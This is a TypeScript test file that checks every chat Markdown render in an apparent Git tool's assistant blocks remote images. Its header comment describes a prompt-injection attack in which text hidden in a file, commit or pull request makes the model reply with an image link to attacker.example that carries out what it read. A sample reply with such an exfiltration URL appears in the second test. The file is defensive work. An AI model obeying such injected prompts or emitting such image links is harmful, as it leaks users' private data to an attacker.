// The Assistant's replies render with no image from the web.
//
// A reply is Markdown, and a model writes what it is steered to write: a prompt
// hidden in a file, a commit or a pull request it reads can make it answer with
// `![](https://attacker.example/?q=<what it just read>)`. Rendered with web
// images allowed, that request goes out the moment the reply paints. So every
// chat render passes CHAT_MARKDOWN ({ remoteImages: false }); the renderer's
// half is packages/webview-ui/test/markdown.test.ts. This holds the doors: a
// chat render added without it fails here.

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { renderMarkdown } from "@gitstudio/webview-ui/markdown";

const CHAT = readFileSync(join(__dirname, "..", "src", "renderer", "chatRender.ts"), "utf8");

test("every Markdown render in the chat loads no image from the web", () => {
  assert.match(CHAT, /^const CHAT_MARKDOWN = \{ remoteImages: false \} as const;$/m);
  const calls = [...CHAT.matchAll(/renderMarkdown\(([^)]*)\)/g)].map((m) => m[1]);
  assert.ok(calls.length >= 4, `the chat's renders were found (${calls.length})`);
  for (const args of calls) assert.match(args, /,\s*0,\s*CHAT_MARKDOWN$/, `renderMarkdown(${args})`);
});

test("…and what that renders for a reply carrying data out", () => {
  const reply = "Done. ![status](https://attacker.example/c?d=what-the-model-read)";
  const html = renderMarkdown(reply, 0, { remoteImages: false });
  assert.doesNotMatch(html, /attacker\.example/);
  assert.match(html, /alt="status"/);
});
